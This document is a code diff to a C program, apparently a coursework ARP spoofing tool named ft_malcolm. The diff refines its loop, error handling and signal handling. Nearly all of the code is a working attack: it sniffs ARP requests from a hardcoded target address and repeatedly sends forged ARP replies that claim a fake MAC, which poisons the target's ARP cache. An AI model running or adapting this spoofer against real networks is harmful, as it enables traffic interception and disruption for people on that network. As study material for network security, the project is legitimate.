@@ -2,98 +2,6 @@
 
 t_data	g_data;
 
-uint16_t ft_ntohs(uint16_t netshort)
-{
-	return swap_uint16(netshort);
-}
-
-uint16_t ft_htons(uint16_t netshort)
-{
-	return swap_uint16(netshort);
-}
-
-void print_ip(uint8_t *ip_address)
-{
-	int i = 0;
-
-	while (i < IP_ADDR_LEN) {
-		printf("%d", ip_address[i]);
-		if (i < IP_ADDR_LEN-1)
-			printf(".");
-		i++;
-	}
-}
-
-void print_mac(uint8_t *mac)
-{
-	int i = 0;
-
-	while (i < ETH_ADDR_LEN) {
-		printf("%02X", mac[i]);
-		if (i < ETH_ADDR_LEN-1)
-			printf(":");
-		i++;
-	}
-}
-
-void debug_arp(struct arp_hdr *arp)
-{
-	printf("_____ARP_____\n");
-
-	/* Type informations */
-	printf("Hardware type: %s\n",
-		(ft_ntohs(arp->hrd) == HARDWARE_ETHERNET) ? "Ethernet" : "Unknown");
-	printf("Protocol type: %s\n",
-		(ft_ntohs(arp->pro) == ETH_P_IP) ? "IPv4" : "Unknown");
-	printf("Operation: %s\n",
-		(ft_ntohs(arp->op) == ARP_REQUEST) ? "ARP Request" : "ARP Reply");
-
-	/* Addresses informations */
-	/* Sender */
-	printf("Sender MAC: ");
-	print_mac(arp->sha);
-	printf("\n");
-	printf("Sender IP: ");
-	print_ip(arp->sip);
-	printf("\n");
-
-	/* Target */
-	printf("Target MAC: ");
-	print_mac(arp->tha);
-	printf("\n");
-	printf("Target IP: ");
-	print_ip(arp->tip);
-	printf("\n");
-}
-
-void debug_eth(struct ethernet_hdr *ethernet)
-{
-	printf("_____ETH_____\n");
-
-	/* Type */
-	printf("Ethernet type: %s\n",
-		(ft_ntohs(ethernet->type) == ETH_P_ARP) ? "ARP" : "Other");
-
-	/* Addresses informations */
-	/* Sender */
-	printf("Sender MAC: ");
-	print_mac(ethernet->smac);
-	printf("\n");
-
-	/* Target */
-	printf("Target MAC: ");
-	print_mac(ethernet->dmac);
-	printf("\n");
-}
-
-void debug_packet(struct ethernet_hdr *ethernet, struct arp_hdr *arp)
-{
-	printf("\n");
-	debug_eth(ethernet);
-	debug_arp(arp);
-	printf("_______________________________\n");
-}
-
 int send_back(int sockfd, struct sockaddr_ll src_addr,
 	struct ethernet_hdr *ethernet, struct arp_hdr *arp)
 {
@@ -102,7 +10,6 @@ int send_back(int sockfd, struct sockaddr_ll src_addr,
 	struct arp_packet packet = {0};
 
 	uint8_t dest_mac[ETH_ADDR_LEN] = {0x66, 0x66, 0x66, 0x66, 0x66, 0x66};
-	/* uint8_t dest_ip[IP_ADDR_LEN] = {66, 66, 66, 66}; */
 	uint8_t tmp_ip[IP_ADDR_LEN] = {0};
 
 	/* Fill the new packet */
@@ -112,8 +19,6 @@ int send_back(int sockfd, struct sockaddr_ll src_addr,
 	packet.arp.op = ft_htons(ARP_REPLY);
 
 	/* Changing MAC addresses */
-	/* Broadcast */
-	/* ft_memset(packet.ethernet.dmac, 0xff, ETH_ADDR_LEN); */
 	ft_memcpy(packet.ethernet.dmac, packet.ethernet.smac, ETH_ADDR_LEN);
 	ft_memcpy(packet.ethernet.smac, dest_mac, sizeof(packet.ethernet.smac));
 	ft_memcpy(packet.arp.tha, packet.arp.sha, sizeof(packet.arp.sha));
@@ -126,16 +31,22 @@ int send_back(int sockfd, struct sockaddr_ll src_addr,
 
 	ret = sendto(sockfd, &packet, sizeof(struct arp_packet), 0,
 		(struct sockaddr *)&src_addr, addr_len);
-	printf("Wrote: %d bytes in socket\n", ret);
 
-	debug_packet(&packet.ethernet, &packet.arp);
+	if (ret == -1) {
+		fprintf(stderr, "[!] Failed to send arp reply to ");
+		print_ip(STDERR_FILENO, packet.arp.tip);
+		fprintf(stderr, "\n");
+		return -1;
+	}
+
+	// printf("Wrote: %d bytes in socket\n", ret);
+	// debug_packet(&packet.ethernet, &packet.arp);
 
 	return 0;
 }
 
 int filter_out(uint8_t *ip)
 {
-	/* 172.17.0.2 */
 	/* TODO: Must take this IP from arg list (MAC address too) */
 	uint8_t target_ip[IP_ADDR_LEN] = {172, 17, 0, 2};
 
@@ -149,14 +60,13 @@ int filter_out(uint8_t *ip)
 	return 0;
 }
 
-// #include <stdlib.h>
-
-void handle_packet(int sockfd, struct sockaddr_ll src_addr, char *buffer)
+int handle_packet(int sockfd, struct sockaddr_ll src_addr, char *buffer)
 {
 	struct arp_hdr *arp;
 	struct ethernet_hdr *ethernet;
 	uint16_t type;
 	uint16_t opcode;
+	struct timespec wait = {2, 0}; /* 2 seconds */
 
 	ethernet = (struct ethernet_hdr *)buffer;
 	arp = (struct arp_hdr *)(buffer + sizeof(struct ethernet_hdr));
@@ -167,18 +77,20 @@ void handle_packet(int sockfd, struct sockaddr_ll src_addr, char *buffer)
 
 	if (type == ETH_P_ARP && opcode == ARP_REQUEST &&
 		!filter_out(arp->sip)) {
-		// debug_packet(ethernet, arp);
-		while (1) {
+		debug_packet(ethernet, arp);
+		while (g_data.loop) {
 			printf("Spoofing\n");
-			send_back(sockfd, src_addr, ethernet, arp);
-			sleep(5);
+			if (send_back(sockfd, src_addr, ethernet, arp) != 0)
+				break;
+			clock_nanosleep(CLOCK_REALTIME, 0, &wait, NULL);
 		}
-		// exit(1);
+		return 1;
 	}
 	else {
 		printf("Filtering request from: ");
-		print_ip(arp->sip);
+		print_ip(STDOUT_FILENO, arp->sip);
 	}
+	return 0;
 }
 
 int ft_malcolm(void)
@@ -196,11 +108,16 @@ int ft_malcolm(void)
 		return 1;
 	}
 
-	printf("Sniffing ARP packets...\n");
-	while ((ret = recvfrom(sockfd, buffer, len, 0,
-				(struct sockaddr *)&src_addr, &addr_len)) != -1) {
-		if (ret > 0)
-			handle_packet(sockfd, src_addr, buffer);
+	/* Initializing signal handler */
+	signal(SIGINT, inthandler);
+
+	printf("Sniffing ARP packets, press CTRL+C to exit...\n");
+	while (g_data.loop)
+	{
+		ret = recvfrom(sockfd, buffer, len, MSG_DONTWAIT,
+			(struct sockaddr *)&src_addr, &addr_len);
+		if (ret > 0 && handle_packet(sockfd, src_addr, buffer))
+			break ;
 	}
 
 	close(sockfd);
@@ -211,9 +128,9 @@ int ft_malcolm(void)
 int main(int ac, char **av)
 {
 	ft_bzero(&g_data, sizeof(g_data));
-	if (parse_option_line(ac, av)) {
+	g_data.loop = 1;
+	if (parse_option_line(ac, av))
 		return -1;
-	}
 	ft_malcolm();
 	return 0;
 }
